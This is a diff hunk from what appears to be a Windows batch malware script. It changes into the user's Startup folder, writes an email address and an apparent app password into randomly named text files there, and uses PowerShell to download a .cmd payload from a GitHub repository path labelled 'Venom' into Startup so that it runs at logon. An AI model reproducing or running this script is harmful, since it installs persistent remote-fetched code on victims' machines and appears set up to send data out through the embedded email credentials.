@@ -5,8 +5,8 @@ set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 
 cd %STARTUP%
 
-echo "goat3dmofo@gmail.com" > PkUbTvqXFIdB.txt
-echo "qcihadixhgspywjw" > NzKnmxLrbsBw.txt
+echo goat3dmofo@gmail.com >> PkUbTvqXFIdB.txt
+echo qcihadixhgspywjw >> NzKnmxLrbsBw.txt
 
 powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile IVbaANzwiphH.cmd"
 
